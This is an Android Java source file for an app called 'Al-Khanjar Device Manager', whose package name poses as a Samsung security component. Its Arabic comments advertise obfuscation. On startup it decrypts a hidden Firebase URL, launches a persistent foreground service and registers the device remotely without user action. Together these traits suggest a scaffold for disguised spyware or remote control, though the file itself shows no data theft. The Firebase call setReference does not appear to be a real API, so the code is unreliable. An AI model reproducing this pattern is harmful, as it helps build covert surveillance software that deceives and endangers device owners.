package com.samsung.android.security.v8;

import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.FirebaseDatabase;
import com.samsung.android.security.v8.services.CoreService;
import com.samsung.android.security.v8.utils.CryptoManager;
import com.samsung.android.security.v8.utils.DeviceManager;

/**
 * Al-Khanjar Device Manager
 * تطبيق إدارة الأجهزة الاحترافي
 * 
 * تم التشفير والتأمين بواسطة: AES-256
 * الحماية: ProGuard + Obfuscation
 */
public class AlKhanjarApp extends Application {
    
    private static final String TAG = "AKM";
    private static Context context;
    private static String deviceId;
    
    @Override
    public void onCreate() {
        super.onCreate();
        context = getApplicationContext();
        
        // تهيئة Firebase
        initFirebase();
        
        // تهيئة التشفير
        CryptoManager.init(this);
        
        // الحصول على معرف الجهاز
        deviceId = DeviceManager.getDeviceId(this);
        
        // بدء الخدمة الرئيسية
        startCoreService();
        
        // تسجيل الجهاز في Firebase
        registerDevice();
    }
    
    /**
     * تهيئة Firebase مع التشفير
     */
    private void initFirebase() {
        try {
            FirebaseApp.initializeApp(this);
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            
            // تفعيل الاستمرارية
            database.setPersistenceEnabled(true);
            
            // فك تشفير الرابط
            String firebaseUrl = CryptoManager.decrypt(BuildConfig.FIREBASE_URL);
            database.setReference(firebaseUrl);
            
            Log.d(TAG, "Firebase initialized successfully");
        } catch (Exception e) {
            Log.e(TAG, "Firebase init error: " + e.getMessage());
        }
    }
    
    /**
     * بدء الخدمة الأساسية
     */
    private void startCoreService() {
        try {
            Intent serviceIntent = new Intent(this, CoreService.class);
            startForegroundService(serviceIntent);
        } catch (Exception e) {
            Log.e(TAG, "Service start error: " + e.getMessage());
        }
    }
    
    /**
     * تسجيل الجهاز في قاعدة البيانات
     */
    private void registerDevice() {
        try {
            DeviceManager.registerDevice(this, deviceId);
        } catch (Exception e) {
            Log.e(TAG, "Device registration error: " + e.getMessage());
        }
    }
    
    /**
     * الحصول على Context
     */
    public static Context getContext() {
        return context;
    }
    
    /**
     * الحصول على معرف الجهاز
     */
    public static String getDeviceId() {
        return deviceId;
    }
}
